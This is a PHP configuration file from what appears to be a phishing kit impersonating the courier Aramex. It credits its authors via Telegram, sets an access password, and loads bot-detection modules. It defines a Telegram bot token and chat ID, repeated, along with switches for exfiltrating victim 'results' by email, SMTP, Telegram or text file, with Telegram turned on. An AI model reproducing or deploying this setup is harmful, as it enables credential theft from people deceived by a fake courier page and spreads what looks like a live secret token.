<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    session_start();
    error_reporting(0);
    include_once 'defender.php';
    require_once 'detect.php';
    require_once 'functions.php';
    define("PASSWORD", 'aramex');
    define("RECEIVER", 'your@email.com');
    define("TELEGRAM_TOKEN", '2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo');
    define("TELEGRAM_CHAT_ID", '-745387116');
	define("TELEGRAM_TOKEN", '2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo');
    define("TELEGRAM_CHAT_ID", '-745387116');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", '');
    define("OFFICIAL_WEBSITE", 'https://www.aramex.com/');

    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>